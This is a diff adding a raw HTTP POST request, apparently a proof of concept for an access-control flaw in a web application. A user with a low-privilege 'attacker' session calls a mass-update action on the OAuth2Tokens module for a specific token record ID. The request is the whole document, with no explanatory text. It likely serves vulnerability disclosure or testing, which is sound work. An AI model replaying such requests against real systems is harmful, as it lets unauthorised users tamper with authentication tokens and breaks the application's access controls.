@@ -1,0 +1,7 @@
+POST /index.php HTTP/1.1
+Host: localhost:33116
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost:33116/index.php?module=OAuth2Tokens&action=index
+Cookie: PHPSESSID=<attacker low-priv session>
+
+module=OAuth2Tokens&action=massupdate&mass[]=f3ed32c1-6629-4ebe-9041-cf5577e8180a&return_module=OAuth2Tokens&return_action=index&current_query_by_page=%7B%7D
